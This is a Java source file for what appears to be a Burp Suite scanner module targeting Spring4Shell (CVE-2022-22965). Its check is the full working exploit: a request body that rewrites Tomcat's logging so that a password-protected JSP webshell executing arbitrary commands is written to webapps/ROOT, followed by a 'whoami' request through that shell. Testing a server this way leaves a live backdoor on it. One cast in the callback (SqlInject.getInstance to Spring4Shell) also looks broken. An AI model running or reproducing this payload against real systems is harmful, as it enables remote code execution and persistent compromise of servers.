package burp.vuls.spring;


import burp.BurpExtender;
import burp.IBurpExtenderCallbacks;
import burp.IExtensionHelpers;
import burp.impl.VulTaskImpl;
import burp.task.SqlInject;
import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.Response;
import org.jetbrains.annotations.NotNull;

import java.io.IOException;
import java.util.ArrayList;
import java.util.List;
import java.util.Locale;

public class Spring4Shell extends VulTaskImpl{
    /**
     * CVE-2022-22965
     * Spring Framework RCE via Data Binding on JDK 9+ (SpringShell)
     * org.springframework.spring-webmvc
     * fix_version: 5.2.20/5.3.18
     */
    // 验证shell的请求
    public boolean isCheck = false;

    public void setCheckurl(String checkurl) {
        this.checkurl = checkurl;
    }

    private String checkurl = "";

    public static VulTaskImpl getInstance(IExtensionHelpers helpers, IBurpExtenderCallbacks callbacks, List<BurpExtender.LogEntry> log){
        return new Spring4Shell(helpers, callbacks, log);
    }
    private Spring4Shell(IExtensionHelpers helpers, IBurpExtenderCallbacks callbacks, List<BurpExtender.LogEntry> log) {
        super(helpers, callbacks, log);
    }

    /**
     * 直接设置shell，访问shell成功则存在问题
     * 每个接口都测，主要漏洞涉及spring的参数绑定逻辑
     */
    @Override
    public void run() {
        if ("".equalsIgnoreCase(checkurl) || !isCheck) {
            this.checkurl = url;
        }
        List<String> c_heaers = new ArrayList<>();
        c_heaers.add("suffix:%>//");
        c_heaers.add("c1:Runtime");
        c_heaers.add("c2:<%");
        c_heaers.add("DNT:1");
        c_heaers.add("Content-Type:application/x-www-form-urlencoded");
        // 参数，作用就是将weshell代码输出到webapps/ROOT目录下tomcatwar.jsp
        // 所以访问shell，就根目录下的tomcatwar.jsp?pwd=j&cmd=whoami
        String data = "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=";

        // 后缀检查，静态资源不做测试
        List<String> add = new ArrayList<>();
        add.add(".js");
        if (!isStaticSource(path, add)){
            List<String> new_headers1 = new ArrayList<>();
            for (String header : request_header_list) {
                // 不要原请求的Content-Type
                if (header.toLowerCase(Locale.ROOT).startsWith("Content-Type".toLowerCase(Locale.ROOT))) {
                    continue;
                }
                new_headers1.add(header);
            }
            new_headers1.addAll(c_heaers);
            okHttpRequester.send(this.checkurl, "POST", new_headers1, "", data, "application/x-www-form-urlencoded", new Spring4ShellCallback(this));
        }
    }
}

class Spring4ShellCallback implements Callback {

    private static final String WEBSHELL_URL = "tomcatwar.jsp?pwd=j&cmd=whoami";

    VulTaskImpl vulTask;

    public Spring4ShellCallback(VulTaskImpl vulTask){
        this.vulTask = vulTask;
    }
    @Override
    public void onFailure(@NotNull Call call, @NotNull IOException e) {
        vulTask.callbacks.printError("[ShiroUseCallback-onFailure] " + e.getMessage() + "\n" + vulTask.request_info);
    }

    @Override
    public void onResponse(@NotNull Call call, @NotNull Response response) throws IOException {
        if (response.isSuccessful()){
            // paylaod发送请求成功的话，进行webshell的请求确认
            if (!((Spring4Shell)vulTask).isCheck) {
                Spring4Shell spring4Shell = (Spring4Shell) SqlInject.getInstance(vulTask.helpers, vulTask.callbacks, vulTask.log);
                spring4Shell.isCheck = true;
                String url = vulTask.iHttpService.getProtocol() + "://" + vulTask.iHttpService.getHost() + ":" + vulTask.iHttpService.getPort() + "/" + WEBSHELL_URL;
                spring4Shell.setCheckurl(url);
                spring4Shell.start();
            }else {
                // webshell的请求确认如果也请求成功，且返回了用户名，则存在问题
                if (vulTask.ok_respBody.length() > 0){
                    vulTask.message = "Spring4Shell";
                    vulTask.log(call);
                }
            }
        }
    }
}
